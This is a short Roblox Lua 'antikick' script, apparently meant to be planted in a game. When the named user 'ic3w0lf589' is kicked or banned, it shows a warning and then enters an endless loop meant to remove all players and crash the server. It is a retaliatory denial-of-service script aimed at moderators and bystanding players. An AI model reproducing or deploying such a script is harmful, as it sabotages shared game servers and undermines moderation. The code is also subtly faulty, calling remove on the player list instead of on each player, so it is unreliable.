n="ic3w0lf589"
--you don't have to change anything else of this script--
h=Instance.new("Hint")
h.Text="Baning or kick ic3w0lf589 will end the server! SO DONT DO IT!"
h.Parent=workspace
function antikick(player)
if player.Name==n then
h:remove()
m=Instance.new("Message")
m.Text="You kicked or banned ".. n.. " so the game is crashing."
m.Parent=workspace
wait()
while true do
p=game.Players:GetChildren()
if #p~=0 then
for i=1,#p do
p:remove()
end end end end end
game.Players.ChildRemoved:connect(antikick)